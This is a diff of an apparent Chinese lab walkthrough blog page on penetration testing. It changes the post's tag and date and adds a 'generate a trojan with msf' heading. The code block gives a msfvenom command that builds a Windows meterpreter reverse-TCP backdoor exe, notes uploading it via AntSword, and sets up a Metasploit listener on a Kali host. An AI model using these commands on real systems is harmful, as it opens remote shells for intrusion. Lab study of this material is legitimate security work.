@@ -54,9 +54,9 @@
 <meta property="og:image" content="https://q1ng-li.github.io/images/image-20260521233824132.png">
 <meta property="og:image" content="https://q1ng-li.github.io/images/image-20260522001654414.png">
 <meta property="article:published_time" content="2026-03-19T01:52:45.000Z">
-<meta property="article:modified_time" content="2026-05-21T16:32:21.829Z">
+<meta property="article:modified_time" content="2026-08-14T18:06:57.590Z">
 <meta property="article:author" content="q1ng">
-<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="攻防技术">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://q1ng-li.github.io/images/%E7%BB%98%E5%9B%BE2.png">
     
@@ -216,7 +216,7 @@
       
     <div class="article-tag">
         <i class="fa fa-tag"></i>
-        <a class="tag-link-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a>
+        <a class="tag-link-link" href="/tags/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/" rel="tag">攻防技术</a>
     </div>
 
 
@@ -325,6 +325,7 @@
 <p>利用之前上线的主机进行spawn</p>
 <p><img src="/./images/image-20260320190717771.png" alt="image-20260320190717771"></p>
 <p>(我这里是失败了，不过看到网上有其他简单的方法反弹  —-  win7的shell)</p>
+<p>msf生成木马</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.40.128  LPORT=1111 -f exe -o shell.exe #kali里生成msf后门文件 shell.exe<br><br>蚁剑上传到 win7上 <br><br>kali里运行监听<br>msfconsole<br>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set lhost 192.168.40.128<br>set lport 1111<br>exploit <br></code></pre></td></tr></table></figure>
 
 <p><img src="/./images/image-20260520134936295.png" alt="image-20260520134936295"></p>
